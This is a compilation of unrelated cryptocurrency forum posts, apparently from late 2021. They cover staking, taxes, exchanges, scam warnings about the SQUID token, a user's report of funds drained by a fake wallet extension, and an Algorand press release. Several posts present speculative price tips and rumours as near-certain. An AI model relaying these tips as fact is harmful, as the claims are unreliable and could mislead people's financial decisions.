Around a week ago I bought my first 100 USDT and after seeing and hearing a lot about AXS's incredibly high APR, I thought (kinda still think but looking for more experienced opinions) that staking it could give me very good returns and with the Metaverse it seems Axie Infinity itself could go up. So I bought 0.52 AXS at 134 and as I said, staking rewards are pretty high (124% on AXS official staking through Ronin wallet) but I'm not entirely sure if I should do that or just get a long term portfolio with a few strong cryptos (like BTC, ETH, ALGO, SOL, DOT). I haven't invested much money though, so I'm not sure what to do. If I had invested like 10k I would've done the portfolio for sure but considering what I invested (100$) I'm not sure if I should just try to grow it based on passive income or just hold a divided amount of cryptos. Would appreciate anyone sharing their point of view

Hello fellow Crypto Redditors,

Ive slowly been investing in BTC and ETH for the last year and Im extremely bullish on the future of these two crypto giants. Im not as knowledgeable on other well known cryptos, but Ive really liked what Ive read about DOT and SOL.

Anyway, my investing style is definitely hands off, long term, and passive. Im not looking to get rich quick, but I want a stable and comfortable retirement by the age of 50 (currently 27). Im currently 90% equities and about 10% crypto (all ETH and BTC). Im looking to responsibly raise my crypto weighting to 30-40%.

Im assuming a lot of users are a lot more knowledgeable in this space and can provide some advice or suggestions. What are the most responsible, long term, and consensus projects for long term investment in crypto? (Sorry no DOGE or SHIBA) Is there really such thing as a passive, long term strategy for crypto?

Thanks in advance.

I have been buying and hodling crypto since 2018. I havent sold anything because I think crypto is still in its infancy and the future potential is wide open. Plus I just use my extra cash that I would put in my savings anyway. AnywhoIve been watching coin bureau videos for a while and decided to support the channel and buy a T-shirt (the Bitcoin rollercoaster one). It was awesome to see they accepted crypto as payment so thats how I paid (and then immediately bought Bitcoin to replace what I spent).

Do you still count your loss towards your taxes, or is that not allowed? Please give examples 

What do you have to do? Like do you have to report it on taxes even if you don't pay?

What problems do you find with such a system that could be improved on? 

What do you like about such a system? 

What country are you in?

Note I'm not asking this toward countries without capital gains tax. I am asking this because I want to push hard with some political people in the USA to maybe change the system where this isn't taxed.

There was a post I saw longtime ago from someone going through the Bitcoin repository and explained on multiple Reddit posts. I remember it was chunked in 6 parts, and I had open for a while; but I lost the link and never saved it.

Can anyone of you, whoever seen it, share it with me? It was pretty interesting to really understand it because it explains the code, and that is what Im mostly interested into and truly understand its purpose.

Im posting this same post on the Bitcoin subreddit.

Thank you all for your help!

How can I buy Polk on KuCoin?

So I am looking into getting into small cap altcoins. Specifically, I am looking into Polkamarket. I am beyond confused of how to use KuCoin. Can someone please explain the basics of KuCoin? I know you buy other eI am pretty confident I know what I am doing but I just want to make sure. 

Please do not say, If you dont know how to use KuCoin, then you shouldnt be investing in this. I have been researching projects for a while and want to start the next step.

Any help would be greatly appreciated.

So guys, recently I came across Cartesi and I was wondering whether or not it was worth investing in it. 

The tech itself seems pretty promising and the roadmap is ambitious but Im still wondering whether or not it is worth it, specially because it seems prone to pumps and dumps.

What are your thoughts on it and do you consider this project to be hidden gem were already to overvalued for what it is?

For those that dont know, this project aims at solving some issues with smart contracts and connectivity between blockchains while allowing for devs to use linux. It also has optimistic rollups for off chain computations

1. Write down your keys. Write them down twice with instructions like you were talking to a golden retriever. 
Test them and try to restore so you know the software is legit. 

2. The exchange only seems like a good wallet til they are hacked remember the term "Not your keys, not your crypto"

3. Dollar cost average to minimize losses.

4. Always buy the dip and hold or have an exact game plan for stop limits if you are a trader. 

5. Take profits but never sell the whole bag. I ditched 200 solana for 1g. Yes im an idiot. 

6. Low transaction count is easier to keep track of and always keep track! Will make tax time easier.

7. Dont try and hide it your not doing anything wrong. 

8. Do hide it from friends and family, if your not married why does the SO need to know. I know it's exciting but they will expect same results and will most likely not put the effort in and get pissed.

9. Stake stake stake.

10. Think about the next 3-6 years and how many boomers will be scammed because they gave away their seed. We haven't even got started on the loss porn. Gonna be tragic. Don't be one of those ppl. 

11. DONT ever send crypto to anyone you don't expressly know no matter how legit. especially exchange support. I was scammed out of 1000 ADA. Yes im an idiot. 

12. Know your investments and research or when it dips you will not believe in the project and want to sell. 

13. There is no get rich quick scheme, time is the only thing that will grow your portfolio. 


14. Btc and Eth are without a doubt the safest long term investment...don't expect your eth shitcoin to be there long term. 

15. Eth gas fees are super high don't mess w those transactions unless you like lighting a match to hundreds of dollars. Token Metrics recommends  at least 25k in Eth to make the fees worth it. 

16. Always send a little amount first to make sure everything legit- one rule I follow is when copy pasting checking the first three and last three letters of the TX address. 

17. Secure your moons there is a vault phrase for them. 



To everyone asking if I'm ok...yes im fine I've learned all the lessons the hard way actually pretty stoked for the next few years.

Edit- Rules 14 on are from the comments and i thought were necessary.

I downloaded and became verified on Kraken back in February. Ive been doing research and am finally comfortable with making my first crypto purchase. But it seems that Kraken does not support the use of credit/debit cards at this time for US people, and my bank is not listed on there for me to use my funds. Ive heard not-so-good reviews of Coinbase Do I open a bank account with a bank approved with Kraken or go the Coinbase route? I saw someone somewhere say they funded their Kraken using Cashapp? Im sorry if this seems trivial. Just frustrated as I was finally ready to take the plunge.

Shit, most of these small cap cryptos with no use cases are scams. For fucks sake if the whitepaper is shorter than a 9th graders essay then there's fuck all reason to be investing. Please for the love of god just apply regular valuation strategies and regular risk / diversification strategies to buying and selling these coins. 

My business partner made like 400% on some shitcoin with no utility and he refuses to sell because "Its gonna keep going up." GIVE ME THREE GOOD FUCKING UNIQUE REASONS OTHER THAN HYPE THAT YOUR COIN IS GOOD.  I'm sick of the scamcoins, regular people are getting fucked by buying crazy amounts of garbage AFTER its already been pumped up.

MY CRASH PREDICTIONS FOR THIS MONTH INCLUDE THE FOLLOWING SHITCOINS: 

saitama-inu: legit doge coin clone, 0 utility

Klee Kai: Shittier version of Doge Dash, I said it was trash last week too (not a fan either hurts me that it has a 13M market cap but at least the game play is half ok)

Shiba inu: Just short term hype pumping it, people keep buying lottery tickets and have no reasoning as to why

Elonomics: name creating hype, more pump and dump shit

Literally anything NFT related that isnt made by a respected artist: (lol dont sell me some E-trading card trash)

Hi there,

Are there any folks here that use peer to peer and non-custodial exchanges for bitcoin or altcoins?  
I am just wondering what is usually the incentive for people to use P2P as opposed to something convenient like CoinBase or Binance.

I started using P2P since early days because I wasn't comfortable funding a Binance account and funding CoinBase was a pain. Are there other reasons? P2P is certainly not necessarily cheaper, so why do people use it?

Thank you in advance for this bit of education!

1. The creator of Litecoin, Charlie Lee, divested in 2017, although he continues to fund the Litecoin Foundation. Whether that divestment qualifies as a rug-pull is debatable; Charlie's divestment didn't move the needle at time-of-sale.
2. A creator-caused rug is now impossible for LTC. ETH can't claim this, since the creators have a stash. BTC and BCH certainly can't claim this, since the Satoshi stash still looms large. BNB, USDT, ADA, XRP, all ruggable, although that doesn't mean it will happen.
3. Brand new coins seem to be the most susceptible to rug-pulls, where creators are eager to drain the liquidity out of their nonsense creation. Be careful out there.

Ive thought about this a lot before but Im curious how many projects people are involved with in this community.

I dont so much care which. With all the different projects getting attention here; BTC, Eth, Ada, Algo, Dot, Matic, Ergo, Link, Montero, XRP, XLM, Doge, Shib, and any other dog rocket Elon coins out there (plus a bunch of other good projects I didnt mention); Im curious how many are most people in on? 

Im currently in on 6 and I debate at times cutting it to 5 because 6 seems like spreading it thin. So how many are you in on?

**You just have to pay a little attention, and you can be safe from scammers.**

It is awful how many posts I have seen in the last month of people who have lost their money by investing in projects that have absolutely no future.

Lets see how we can recognize a coin that has no future, or at least how I do it  

**1. TEAM** 

If the creators of this coin are hiding and not revealing their identity, then we can freely say that they are trying to hide something from us.  There are two reasons for this: they are preparing to steal your money or they themselves are insecure about their project and in case that project falls they can throw themselves into new ones, with clean biographies.  

&amp;#x200B;

**2. WHAT IS THEIR PROJECT, READ THE WHITEPAPER**

If they dont have a project but just attract customers with their great burning % of the coins and APY which is almost unrealistic, if everything sounds too good to be true then it is probably a lie.

&amp;#x200B;

**3. LIQUIDITY POOL** 

 What is their liquidity pool and is it locked? If it can be unlocked tomorrow why are you still there? Get away from it. Scammers will not usually put big money into a liquidity pool.

&amp;#x200B;

**4. WEBSITE, Coin name and picture on the coin itself**

As stupid as this sounds, this is very important. 

If the design of their coin is something we have been able to see a hundred times so far and if the name is similar to some other coins you are literally dealing with shitcoin.

If their team on community platform is inactive, if you only see memes being sent there without developer messages, I recommend you ask yourself if that coin is where you want to invest your hard earned money. 

&amp;#x200B;

**5. Dead wallet**

**Satoshi wrote**  

*Lost coins only make everyone else's coins worth a little more. Think of it as a donation to everyone. *  

Is there any dead wallet that would reduce the possibility of rug pull? If it doesnt exist, or if it exists with a very small percentage I wouldnt recommend investing in it. Also, the largest coin holder should be the liquidity pool.  Keep an eye on this or you will finish like people who invested in stupid squid.

So your favorite korean thriller themed token is down by 99 percent? You know the drill! Tis nothing but a simple correction. Always buy the dip! Seems like a great freaking discount to me. Maybe one day it'll reach its ath again. Lol. Remember to always buy low and sell low. Oh wait i mean buy low sell high. Or was that that the other way around. Its a great token backed by solid fundamentals so you can be a 100 percent sure it's not gonna get rugpulled. 

So once again BUY THE DIP. 

This is financial advice. Or not. Whatever.

**Centralized Exchanges:**

Basically the same types of investor protection as you see in brokage firms.

1. Investor protection from glitches and hacks. Basically, insurance that will repay you if hacks or glitches takes out your coins/funds. Note protection that you see in brokerage they protect you to $ amount. If they want to go beyond that then it is welcome. But this doesn't cost account holders anything.
2. Investor protection from exchanges stopping you from buying/selling for reasons outside of the TOS. And if push like in normal firms they will be investigated on why.

# WHAT WE DON'T WANT is pattern trader rules or rules that block traders from doing what we are doing now in crypto on exchanges.

# The PDT rule only benefits the elite while harming most everyone else.

**Decentralized Exchanges:**

Note they can go after the companies that run them.

Basically, we need to know if the company changes something important in the coding. And there should be fraud protection from the company who runs the decentralized exchange. 

**Taxes:**

* We want the tax law to be clear
* We want the tax law to be easy to follow
* We want the tax law to be like with other things. If a baker who makes a cake doesn't get tax on the cake until they sell. Why is it that when you help make a new crypto coin through staking or mining you're taxed as income on that?
* We want crypto to crypto swaps to be tax free. Basically, the only time the tax should apply is when we get paid in crypto from our job, or when we sell, buy goods with it, or buy services with it in the real world (meaning if you buy something in the metaverse that is still within the game and you shouldn't get ding).
* We want rules which makes it if we are playing a game that uses NFT for items in the game, or coin rewards in the game **to be used in the game or other games. (meaning I'm not talking about gambling but I am talking about normal games)** Where we don't get a income tax when we get the item, reward, or NFT. And you don't have to pay capital gains if you use the item, reward, or NFT within the game, use it in another game, or trade it with another player unless if you're trading it for fiat, a real world good, or a real world service.

I think most are OK on income tax if you get paid in crypto for your job, or paying capital gains for when you sell the crypto for fiat, a good, or a service. 

But I think the IRS and other powers should be extremely open to getting paid with crypto. For example, if crypto to crypto swaps isn't taxed. It shouldn't be a problem to use a stable coin or something instant and free like NANO to pay your taxes with.

&amp;#x200B;

There might be other things and opinions might change from person to person. If so, please leave them below. But this should get people a better understanding about why people are asking for regulation or better regulation vs none at all. But note, I honestly don't trust the gov and think they will over regulate as they are doing right now.

Okay, hear me out. We know that a lot of wealthy people don't really like crypto. There can be various reasons but overall it damages big banks, governments etc. We've seen hundreds of different attempts of stopping/banning Bitcoin/crypto and all of them failed. And the more we move forward, the harder it becomes to stop crypto. Bitcoin recovered in a few weeks after the largest country in the world banned it. 

There were 2 big arguments against crypto in the early years:
1. It's useless/has no value
2. It's very risky/volatile

Both of them are not true for Bitcoin or any other major crypto, the price is relatively stable (and growing), Bitcoin is already a legal currency in 1 country and there are hundreds of different use cases for alts.

So imagine you're a billionaire who hates crypto, how do you stop it? Bring back that old narrative and prove it right! You can't do that with Bitcoin but Shiba Inu, Dogelon Mars or another copycat memecoin is perfect for that. It's a copy of a copy of a meme, so it doesn't have a real utility. The market cap is relatively low. You can invest a few million dollars and pump the price 100-300%. What happens nexts is all mainstream media will write about this new "Bitcoin killer grew 300% in 24 hours". Everyone will jump on board, especially people who are not very experienced and the price will keep growing. Then you sell all your coins and the price will drop, people will start panic selling. Nobody will talk about Ethereum's new ATH or a new legit crypto project, everyone will talk how they made/lost millions with Shiba Inu. The old narrative will be proven right again: crypto is volatile and useless. And the best part? You will make a lot of money with your pump and dump. Once it's done you can repeat the same thing with another coin. Maybe make a new one yourself. You can even use the same coin in a few months. 

I'm not saying this is what's happening but this is what I would do if I was a billionaire and hated crypto. 

tl;dr the recent pumps and dumps in shitcoins can be caused by anti-crypto rich people who want to delegitimise cryptocurrencies.

What happens next for ETH after its big upgrade to ETH 2.0 ?

Is there a new goal, ETH wants to archive when it's all settled down? What comes after the ETH 2 implementation of its roadmap. Is the only goal to lower fees, or is there anything else going for ETH in the future. The competition is not sleeping and always innovating.                                                                                       

&amp;#x200B;

&amp;#x200B;

What are your thoughts on this, and why would you invest into ETH and its ecosystem  ?

What are the alternatives  ?

I'll try to keep this short but can answer questions in the comments.

1. 1.14.5 which reduces transaction fees and increases transaction efficiency [looks like it's about to be released in the coming days.](https://np.reddit.com/r/dogecoin/comments/qkfi1b/comment/hixi35s/?utm_source=share&amp;utm_medium=web2x&amp;context=3) (includes multiple links and more information with links to Doge Github)
2. Just a few days ago the #1 Doge wallet woke up after 6+ months and started sending it's 36.7B doge around - this wallet is now sitting at 4.1B Doge. - [5 out of the top 15 wallets are linked to this whale](https://bitinfocharts.com/dogecoin/wallet/3334959) with a combined Doge supply of 30% between them. This is thought to be RH moving money (from cold storage to hot storage) as it prepares for crypto wallets in the next few days/weeks. [Everything I've collected on this whale here](https://np.reddit.com/r/dogecoin/comments/qj7rrx/we_did_it_we_got_the_attention_of_billym2k_who/). Please note there are links inside of links inside of links.

This one is probably the biggest especially if 30%+ of Doge is currently locked behind RH and can't be used for adoption - it also helps with Doge's lopsided distribution that gets used to FUD Doge about "Rugpulls". I would say it's about the closest we can get to a confirmation that this whale is RH other than RH confirming it themselves.

If you're on the fence about this one watch the top wallets linked inside over the coming days; and see if they start distributing Doge around in smaller increments. That would almost indisputably it's RH preparing for wallet rollout.

\----------------------------------

3. WildCard - but worth consideration. Elon has pumped the changes going into effect with 1.14.5 [over 9 times since May.](https://np.reddit.com/r/dogecoin/comments/q25x3q/elon_has_pumped_the_changes_going_into_effect/) (note he has pumped the changes a few more time since that post was made). Additionally 6 days ago an article came out that Tesla was [considering transacting in cryptocurrencies](https://news.bitcoin.com/tesla-informs-sec-it-may-restart-transacting-in-cryptocurrencies/). keyword plural and he has previously teased accepting Doge. The two pieces above both seem like they would be important things for Tesla to consider before accepting Doge.

\----------------------------------

In any case the pieces are in place for Doge to see some Giant Green Candles soon. Nobody can guarantee anything in crypto, but if I had to - I'd say it it's very likely. If you don't trust me on face value - check the links. If you don't trust the links double check my sources.

That being said there are links inside of links inside of links, for you to do your own research - let me know if you have any questions in the comments.

I cant think of a bigger barrier to mass adoption than people refusing to take part in an ecosystem in which were artificially creating wealth disparities even greater than Bezos/Musk. Were at the political crossroads of massive frustration from the working class participating in systems that dont benefit us but were all acting as temporarily embarrassed millionaires during the Gold Rush. Theres so much cognitive dissonance in these ideas that we forget wealth doesnt exist in a vacuum and can be a zero sum game. In what way can we utilize blockchain that benefits humanity but doesnt require being early to these ecosystems in order to be ahead other people? I believe crypto is the future, but I want a better way for all people, not just for me because I know about it early. Am I alone in this?

Let's debrief on what happened to SQUID:

1. The token lost 99% of its value in 5 minutes last night ($2,861 to $0.0007) 

2. The website had fake creator profiles

3. People could put money in but couldn't take it out

Given that the website and Twitter handle have all but disappeared, I thought we could find some other live scams in progress as a community. A good place to start might be:

[https://coinmarketcap.com/gainers-losers/](https://coinmarketcap.com/gainers-losers/)

The idea is we would find a scam and tell beginners how to spot the warning signs.

Who wants to investigate a token and share the warning signs below?

You would think that with as big as the meme coins and trash gambling coins are popping off .  Hex wouldnt be down 50%.  Lol 

Even the big time gamblers are silly enough to throw away money on that stuff. 

Glad you all helped me not lose all my uncles money.   When he wanted to get invested in that. :) 

I do kinda feel bad for all them poor souls.  Gonna be much poorer while they sit and watch unboxing videos of things that guy is buying with all their money.  Smh. 

Anyone got anything new they wanna throw out there to take a look at grabbing some of ?  A lot of things are moving well at this current time, lets hope they keep moving.   Some down. Haha

Hey, i have been trying to orient myself on exchanges, and having a hard time finding a reliable source that isn't outdated or misses a lot of information.

I am interested in automated trading, and in a big part lf Europe, Binance is starting to eat dust left and right.

So i am trying to find a reliable exhange to switch too, meaning it should probably comply with european regulations like Know Your Customer etc.

Automated trading benefits from low trade fees (0.1% on binance, 10$ min trade size)
It also benefits from having many currencies to pick from, but to me personally i only care about the bigger ones.

And ofcourse it needs proper API support that allows automated trading to happen. Usually bigger exchanges have better support to programmers.

Finally, (cheap) SEPA transfers are usually a must in Europe. Having a creditcard is not all that common.

Coinbase seems to cover a lot, but they have very high fees at 0.5% for example.

What would be good exchanges that come close to all of these desires for people like me who look for automated trading adventures?

So as we all know by now, Loopring (LRC) will probably collaborate with Gamestop (GME) to publish their NFT marketplace someday soon. Rumours have it they are not allowed to confirm anything in this direction yet, though hinting at a big partnership with news coming in Q4 and source code being found in their Github linking to GME, most probably having to wait for them to make the announcement.

LRC is already up about 80% to when I'm writing this, sitting at a nicely looking solid Dollar. Perfect for you degenerates who can't do basic math and want to invest round amounts of money. Let me make it even easier for you: 100$ can be 100 LRC, as of right now. What, I forgot about the fees? Fair enough, but as you're reading this, LRC is already going up in price so you better move your butt already. Alright? Good, now let's check where to get the good fix for your portfolio.

I use crypto dot com, but you can get LRC on coinbase, binance, huobi, Kucoin, Kraken, Bitfinex and even Zipmex (whatever the hell that is), so get your credit cards out and let's see where that ride is taking us. No financial advise though, I just threw some DOT profits at it to see if I can make a good call for once or nah.

See you on the other side ya monkeys! Cheers!

EDIT: Depending on your region you can get some free LRC on Coinbase right now, so hit up your CB Earn and hop along the ride with us.

Hello, we (me and my dad) bought Floki Uni at 3 different times in Uniswap and sent some coins to another wallet and ever since I've been unable to swap, send or sell any of my coins.  Note the amount of coins is different from my original buys, so I stopped trying to move them all together, was this a scam? Did Floki had a fork? And that the hell happened to my coins.  Below is a link with a screenshot of how the appear on my app.  

Thanks very much any advise is greatly appreciated!

A fine example where HYPE coins can lead into such drop outs. With Twitter marking the SQUID account as Suspicious the Hype train went down. 

SQUID token, a play-to-earn crypto, which, in keeping with the shows game theme, requires individuals to buy tokens to compete in online games, and earning furthermore tokens subject to their win, from a meager 14$ to almost 4.6k$, all in less than 100 hours? The crypto zoomed over 2,400 percent in just 24 hours, taking its market capitalisation to 174 million dollars, sky-high for a nascent cryptocurrency like it was. In fact, the coin, which started its pre-sale on October 20, was sold out in a single second!


Link:
https://www.moneycontrol.com/news/business/cryptocurrency/squid-crypto-a-sham-plummets-almost-99-99-in-value-within-seconds-7664771.html


In what can only be described as a textbook case of rug-pull, where developers abandon the project and siphon away all investor funds, the SQUID token nosedived by more than 99 percent, wiping off the entirety of its gains, peaking at as much as 2,861 dollars to crash-diving below 1 dollar in just a few seconds.

This happened shortly after Twitter flagged the official account as suspicious, with just over 7 lakh subscribers as suspicious. Per Coinmarketcap, at the time of writing, the token still has an unverified, self-reported market cap of 1,802,875 dollars, down by almost 99.99 percent. Notably, the whitepaper and the official website of the token have vanished entirely.

The other day I learned about Loopring on Coinbase and how it runs on the Layer 2 protocol of the Ethereum network, which is on top of Layer 1. I saw my $1.50 in Loopring had a pretty good day today which got me a little more excited about the technology behind the token. I want to figure out what the difference between the two is. My understanding is that Layer 2 is supposed to solve transaction fee and scalability issues, but Id like to know more about it and if it ties into the ETH 2.0 project. And does Loopring serve as sort of a supplemental token to Ethereum or is it its own token with its own functionality? Sorry for the rambling; I didnt know that there was a character limit to make posts in this community.

With there being thousands of coins and different ways to earn passive income with staking and pools, which Im still dont know entirely how they work, how do you make your coins work for you? 

For me Ive been sticking to staking or lending on apps like CRO(their lock up time is a pain but it makes me hodl) for earning with my coins. But I have noticed some coins can earn higher percentages on different apps.

What coins are you staking and what are the best rates youve found for that coin?

So Im currently staking..

DOT: Crypto.com at 10% and Fearless wallet at around 12%

ALGO: Algorand wallet and governance

MATIC: Crypto.com at 10%

ETH: Crypto.com at 5.5% and Hodlnaut at 7.2%

ADA: Crypto.com at 2%(I know I can stake for higher, which app do you recommend?)

USDC: Crypto.com 10% and Hodlnaut 12.7%

ATOM: Cosmostation about 10%

ONE: Guarda Wallet 10%

I had ETH in my metamask on my Binance Smart Chain Network. I wanted to switch Networks and I went to Binance Bridge - it asked me to install extension from Binance Smart Chain Wallet. I thought it was recommended from official page, so I didn't see a harm in installing the extension.

The moment I installed it, BOOM, I didn't even hit send and my funds were transferred to this address:

[https://bscscan.com/token/0x2170ed0880ac9a755fd29b2688956bd959f933f8?a=0xa18293c8bd7329d7cb81ef50a18c12bd9d6ba2d4](https://bscscan.com/token/0x2170ed0880ac9a755fd29b2688956bd959f933f8?a=0xa18293c8bd7329d7cb81ef50a18c12bd9d6ba2d4)

it was about 0.41 ETH ($1800).

This was the transaction: [https://bscscan.com/tx/0x4143b49023fe4a67cac033f45ad00e22f9e93c4330f57faaa4459348db467f66](https://bscscan.com/tx/0x4143b49023fe4a67cac033f45ad00e22f9e93c4330f57faaa4459348db467f66)

Did I just lose my money?

Guys this is the **scam extension:**

I've started trading crypto since the crash happened with lots of joy because of the upward trend. However, Q4 seems to have a lot of hype for a second run, even October has a direct bullish trend with + \~20% for BTC and growth in other crypto which makes this exciting. 

But like we all have read in the repetitive posts in this subreddit; November and December *could* be **extremely** bullish and cause a +50% push. Man, I can't take my eyes off the charts anymore because of the hype. I've been checking the price and candles of BTC and other large cap crypto's too much, and I can't seem to stop thinking about them. 

It could be the Q4 hype, the previous broken ATH, or all these crazy price predictions by casuals/analysts... but goddamn this price checking has become unhealthy and I don't know how to stop. 

If any of you have learned ways to stop checking the price too much during breaks during the day, please let me know how lol.

Hello fellow cryptonauts,

After seeing the highs of Shiba Inu and the lows of Squid games this past month, I am very happy with my decision to have a boring portfolio. BTC and ETH aren't anyone's idea of sexy exciting crypto, and I'm fine with that. I don't expect them to moonshot next month, but I feel fairly confident that just by holding them and DCAing into them over the next few years will give healthy returns without a tremendous amount of risk.

I 100% get the allure of coins that pull you in and at least have a chance of doing 500x or even 1000x. I do feel the itch of gambling like that sometimes, so what I do is set aside a small amount (maybe 3% of my portfolio) that I can use for "play money" I can put it into the stupidest coin I can find (and boy are there some stupid ones). If one of my gambles pays off, at least I hit a piece of it while feeling safe in the knowledge that the vast majority is in crypto I actually believe in.

As always, this is just the way I do it. If you are investing significant amounts in moonshots, truly hope yours hits big.

With all the hype around DOT today due to the pump and the upcoming auctions I was wondering what others opinions are on the 2 year lock up(96 weeks) for the parachain auctions. 

Another thing that I saw in the daily was people talking about the 5 DOT minimum for each auction, which I also think that is a little high but I was never involved in the KSM auctions. 

Please share any thoughts or opinions!

Acala: 1 DOT : TBA ACA

Centrifuge: 1 DOT : TBA CFG

Darwinia: 1 DOT : TBA RING

Equilibrium: 1 DOT : TBA EQ

Manta Network: 1 DOT : TBA TBA

Moonbeam: 1 DOT : TBA GLMR

Parallel Finance: 1 DOT : TBA PARA

Astar: 1 DOT : 1+ ASTR
- 20% bonus if you join before the end of Auction #1
- 10% bonus if you participated on Plasm Lockdrop or Shiden Crowdloan on Kusama
- 1% referral bonus 
- 10% of the reward will be released immediately
- 90% will be unlocked linearly for 22 months

Litentry: 1 DOT : 2.5+ LIT
- 10% additional bonus before parachain auction starts
- 5% additional bonus within the first 7 days since parachain auction starts

I'm from Argentina and we have a 50%+ inflation rate, as you all know this is really bad. Worst of all, the goverment does not allow you to buy more than 200 dollars every month. So saving has become increasingly difficult given that the currency loses a third of it's value every year. 

So in this context come stable coins. Tied to the value of the dolar, easy to buy and trade. Hard to get robbed on (unlike physical dolar bills). Basically they have given me the chance, and for other latin-american people, to save and plan for a future life. This also applies to people at Venezuela, who are having a much rough time.

So in conclusion, for most people in developed countries stable coins may seem pointless as you can have as much dolars as you want in your bank account, but for many people in developing countries like myself they give us a chance to shelter from the financial risks of our economy. Like americans use BTC, crypto and stocks to shelter from inflation in the USA, we want to shelter from our crazy inflation by buying dolars.

How is Eth so popular Waitt Gas fees? What am I missing? 

Just created MetaMask account to pick up some tokens not available on main exchanges. 

Looking to grab UFO and Cube. 

The gas fee is as much as the crypto purchase? First time experiencing this. 

Is there a way to circumvent? Or do I just sit tight until Eth 2? 

Are people really picking up shit coins like floki for an insane gas fee?  Doesnt seem worth it? 

Im pretty new to this so please let me know if I am do something else. Really want these two coins but didnt want to outlay a lot of $$$$ to get them.

I recently read that [Stellar and Polygon finally got a token bridge](https://www.investing.com/news/cryptocurrency-news/newscrypto-polygon-bridge-is-now-live-on-mainnet-with-chainlink-integration-2661014), allowing XLM holders to use their tokens in the Polygon network. In terms of technicals, it says NewsCrypto built the infrastructure for it as well as Chainlink integration for boosted security. Ive heard all of these names before, but not all in the same project.

I read good things about XLM, mainly its affordable transaction fees and its popularity in the liquidity market. As someone staking in ETH, Ive also read that Polygon makes use of the Ethereum VM quite well as a layer-2 chain. But thats about it - Im not entirely sure in terms of the financial side of things.

I want to ask for insights if nows a good time to stake in XLM given the Polygon bridge, and/or if XLM is a good investment for someone like me who wants to mostly hodl? Thanks!

I have been thinking a lot lately because I first got my introduction to stock via GME. Of course it was the craze of seeing 15 percent jumps in a day and a feeling of : woow it's crazy shit!

Now fast forward 3 months, I got introduced to crypto just before May's  crash and as I was leveraging X20 just before and during the crash (because everyone thinks he is on steroids during a bull run) I got really fucked by the crash which basically numb my feelings about ups and downs.

Finally now I am 10 months later and learned so much but know so little about this world. And I am heavily invested in crypto. I face the May's crash and held onto my ADA and ALGO which made me in profit now. But then I feel completely immune to small percent gains anymore and that feels wrong.

I mean yeah I \*3 DOT and \*2 LRC just recently and feel great about it. But price movements like just happened in stock market (GME) today don't even bother me anymore.

Are we only chasing huge gains now? No moe steady increase? Am I the only one feeling that I am actually numb and immune until we get a awful crash that will make me nervous again?

1. Loopring, with Game Stop deciding to use LRC for their NFT platform it's a buy the rumor sell the news type of situation. Something to sell 80% of upon release of the platform and keep rest for what ifs. This was an easy pick up few days ago when announced and already up 70%
2. KCS, if you're not familiar with Kucoin they have 1 in 4 crypto customers, have moved from rank 5 on Coinmarketcap to rank 3 exchange, and has had their kcs token climb over 1.5b market cap. Kucoin takes half of the daily fees and pays it to kcs holders as daily dividend so it compounds too. With only Coinbase and Binance exchanges ahead in size, and bnb at 80b market cap, kcs is a potentially good long hold.
3. Dogelon, can't believe I'm mentioning a memecoin but things got real for me when they donated funds to send tissue to International Space Station ISS. Understand they do not have an association which some may mistake it as so, but it's damn good marketing. Breaking top 100, am waiting for it to finish it's Binance listing then Coinbase and am out.

What's your top alt coin? Have any DD to back up why it should be considered?

Many people will probably not beat this challenge. The crypto tradition for November is to not look at the charts. If you look at the charts, then you lose. Remember, the spirit is willing, but our bodies are weak. You must resist looking at the charts at all costs. 

Here are some ways that you could stop looking at charts:

1. Go to jail

If you commit a crime, then you will have forced holding and will not be able to stare at charts. 

2. Be in a coma

You will have to spend one whole month with looking at charts, so the best way is to be gone during that time. One the coma is over, you will be able to look back at your charts. 

3. Hide your devices

You might be tempted to get your phone out to take a quick look at the charts, but don't. Keep your charts away from you at all costs. 

I'm probably going to lose this challenge and keep on looking at charts. Happy no charts November fellow crypto people.

The convenience store near where I work just had a Bitcoin ATM installed. Even with high fees associated with Bitcoin ATMs I tend to think of them as good for getting people to aware and seeing it as a normal part of their everyday life.

However, the Bitcoin ATM is right in the area with the lottery tickets. It's literally between the scratch off tickets and where you ask the cashier for Powerball and Mega Millions tickets. I'm worried it's placement will make people associate it with gambling. I think, even with the fees, it's a better investment than buying a lottery ticket, but I don't like the association. 

We may joke about crypto being gambling, and maybe it is with some memecoins, but if crypto really is going to be what we want it to be in the future it has to be more than just gambling.

What do you think? Am I overanalyzing an ATM placement? Will this be a net good for crypto?

*October 28th, 2021 - 'Greenest blockchain Algorand partners with the Greenest Team on the Greenest Grid Envision Racing to ensure the next generation of blockchain adoption and innovation is environmentally friendly.*

Envision Racing has today announced a new multi-year partnership that will see the Algorand Foundation become the teams Platinum Partner.

The Algorand Foundation is dedicated to fulfilling the global promise of blockchain technology by leveraging the power of the Algorand protocol and its ecosystem, to enable everyone to harness the potential of an equitable, truly borderless, digital economy, built on a carbon-negative network, that will help sustain a better planet.

Like Envision Racing, the Algorand Foundation has a commitment to a sustainable future built on cutting edge innovation and high-performance, backed by durability and reliability forged in the heat of real-world competition.

This collaboration sees the Algorand Foundation become a partner of the teams innovative *Race Against Climate Change* sustainability programme, created to help amplify the fight against climate change and accelerate the movement to zero emission vehicles. Envision Racing will also work with the Algorand Foundation to strengthen its community initiatives, including supporting the Foundations developer and innovator community events.

Commenting on the announcement, **Franz Jung, Vice President ofEnvisionGroup and Chairman of the Board ofEnvision Racing Formula E team** **said**: Sustainability and addressing the climate crisis through the deployment and adoption of innovative new technology is core to why we exist. Were delighted to be partnering with the Algorand Foundation because, whilst blockchain technology provides many interesting new opportunities for us, and many other organisations, Algorands technology allows us the unique opportunity to deploy blockchain in the most environmentally responsible way.



**Sean Lee, Chief Executive of the Algorand Foundation, added**: The Algorand Foundation, in its mission to build awareness of the Algorand blockchain and its rapidly growing ecosystem, had been seeking a global partnership that would deliver that increased awareness on a platform that delivered the passion and excitement of highly competitive sports but that would also parallel the key sustainability values of the Algorand ecosystem. Were thrilled to partner with Envision Racing, with whom we have so many amazing synergies.

**Lee continues:** The Algorand blockchain has been built from the outset to have the smallest possible carbon and energy footprint, and to provide a uniquely sustainable blockchain platform for innovators around the world who want to create technology that has sustainability at its core. We look forward to supporting each other in our missions to show that sustainable, climate friendly innovation is the optimal approach to creating our future technology and economies.

